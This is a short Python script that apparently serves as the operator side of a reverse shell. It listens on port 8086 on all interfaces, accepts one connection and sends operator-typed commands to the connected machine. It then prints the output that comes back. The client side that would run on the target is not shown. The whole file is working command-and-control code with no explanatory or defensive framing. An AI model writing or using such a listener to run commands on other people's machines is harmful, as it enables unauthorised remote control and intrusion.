import socket 
#shell to clien

ip = "0.0.0.0"
port = 8086

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


s.bind((ip,port))
s.listen(2)

conn,addr = s.accept()
print('[*] Connected ',addr)

while True:
    command = input("Shell>>")
    if command=='exit':
        conn.send(b'exit')
        conn.close()
        break
    else:
        conn.send(command.encode())
        output=conn.recv(1024)
        print(output.decode('utf-8',errors='ignore'))


